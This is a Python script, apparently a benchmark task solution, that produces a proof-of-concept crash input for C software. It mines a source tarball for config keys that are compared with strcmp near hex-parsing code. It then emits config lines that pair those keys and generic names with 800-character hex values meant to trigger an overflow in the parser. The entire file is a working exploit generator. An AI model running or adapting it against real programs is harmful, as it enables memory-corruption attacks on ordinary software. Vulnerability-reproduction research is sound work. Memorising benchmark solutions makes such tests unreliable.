import tarfile
import re


class Solution:
    def __init__(self):
        pass

    def _is_potential_key(self, s: str) -> bool:
        if not s or len(s) > 64:
            return False
        for ch in s:
            if ord(ch) < 33 or ord(ch) > 126:
                return False
            if ch in "%\"'\\{}[]()":
                return False
        if " " in s or "\t" in s:
            return False
        if not re.match(r"^[A-Za-z0-9_.:-]+$", s):
            return False
        return True

    def _key_sort_key(self, key: str):
        s = key.lower()
        score = 0
        if "hex" in s:
            score -= 100
        if "addr" in s or "address" in s:
            score -= 40
        if "mac" in s:
            score -= 30
        if "key" in s:
            score -= 20
        if "color" in s or "colour" in s:
            score -= 10
        if "id" in s:
            score -= 5
        return (score, len(key), key)

    def _extract_keys(self, src_path):
        hex_keys = set()
        general_keys = set()

        cmp_patterns = [
            re.compile(r"strcmp\s*\([^,]+,\s*\"([^\"]+)\"\)"),
            re.compile(r"strn?cmp\s*\([^,]+,\s*\"([^\"]+)\"\)"),
            re.compile(r"strcasecmp\s*\([^,]+,\s*\"([^\"]+)\"\)"),
            re.compile(r"strn?casecmp\s*\([^,]+,\s*\"([^\"]+)\"\)"),
        ]

        try:
            tf = tarfile.open(src_path, "r:*")
        except Exception:
            return [], []

        code_exts = (".c", ".h", ".cpp", ".cc", ".cxx", ".hpp", ".hh")

        try:
            for member in tf.getmembers():
                if not member.isfile():
                    continue
                name = member.name
                lower = name.lower()
                if not lower.endswith(code_exts):
                    continue
                try:
                    f = tf.extractfile(member)
                    if f is None:
                        continue
                    data = f.read(2 * 1024 * 1024)
                except Exception:
                    continue
                if not data:
                    continue
                try:
                    text = data.decode("utf-8", "ignore")
                except Exception:
                    continue

                lines = text.splitlines()

                # Collect all candidate keys from strcmp-family
                for line in lines:
                    for creg in cmp_patterns:
                        for m in creg.finditer(line):
                            cand = m.group(1)
                            if self._is_potential_key(cand):
                                general_keys.add(cand)

                # Find hex-related contexts and associated keys
                for idx, line in enumerate(lines):
                    is_hex_line = False
                    if "isxdigit" in line or "iswxdigit" in line:
                        is_hex_line = True
                    elif "strto" in line and "16" in line:
                        is_hex_line = True
                    elif (
                        ("scanf" in line or "fscanf" in line or "sscanf" in line)
                        and ("%x" in line or "%X" in line)
                    ):
                        is_hex_line = True

                    if not is_hex_line:
                        continue

                    # Search upwards for nearest strcmp-like key use
                    for j in range(idx - 1, max(-1, idx - 41), -1):
                        l2 = lines[j]
                        found = False
                        for creg in cmp_patterns:
                            m2 = creg.search(l2)
                            if m2:
                                cand = m2.group(1)
                                if self._is_potential_key(cand):
                                    hex_keys.add(cand)
                                    found = True
                                break
                        if found:
                            break
        finally:
            try:
                tf.close()
            except Exception:
                pass

        return list(hex_keys), list(general_keys)

    def solve(self, src_path: str) -> bytes:
        hex_keys, general_keys = self._extract_keys(src_path)

        lines = []

        # Many parsers ignore an initial blank line; it is unlikely to cause failure
        lines.append("")

        if hex_keys:
            keys = sorted(set(hex_keys), key=self._key_sort_key)
        else:
            keys = sorted(set(general_keys), key=self._key_sort_key)

        max_keys = 8
        if keys:
            keys = keys[:max_keys]

        big_hex_len = 800
        big_hex = "A" * big_hex_len
        small_hex = "A"

        if keys:
            # Add small values first to mimic valid configuration entries
            for k in keys:
                lines.append(f"{k}=0x{small_hex}")

            # Add long hex values that should trigger the vulnerable handling
            for k in keys:
                lines.append(f"{k}=0x{big_hex}")
                lines.append(f"{k}={big_hex}")
        else:
            # Fallback: pure long hex tokens
            lines.append(big_hex)
            lines.append("0x" + big_hex)

        # Generic hex-related keys to increase chances without depending on extracted keys
        generic_keys = ["hex", "value", "data", "key", "addr", "address"]
        for gk in generic_keys:
            lines.append(f"{gk}=0x{big_hex}")

        poc_str = "\n".join(lines) + "\n"
        return poc_str.encode("ascii", "ignore")
